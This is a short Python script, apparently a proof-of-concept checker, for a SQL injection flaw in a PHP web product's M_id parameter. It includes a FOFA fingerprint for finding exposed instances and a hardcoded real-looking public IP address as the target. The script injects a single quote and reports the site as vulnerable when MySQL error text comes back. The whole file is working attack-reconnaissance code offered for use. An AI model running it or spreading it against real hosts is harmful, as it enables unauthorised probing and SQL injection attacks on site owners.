#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+          FOFA:icon_hash="1420424513"')

def run_proto(url):
    target_url = url + "/?M_id=11'&type=product"
    try:
        headersUrl = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        session = requests.session()
        getSession = session.get(url=url, headers=headersUrl, verify=False, timeout=6)
        getCookie = re.search(r'(PHPSESSID.*?);', getSession.headers['Set-Cookie'], re.I)

        headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Cookie': '{}'.format(getCookie.group(1))
        }
        response = session.get(url=target_url, headers=headers, verify=False, timeout=6)
        if 'mysqli_result' in response.text and 'Warning' in response.text and 'parameter' in response.text and response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False
def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = '49.233.23.185:9000'
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')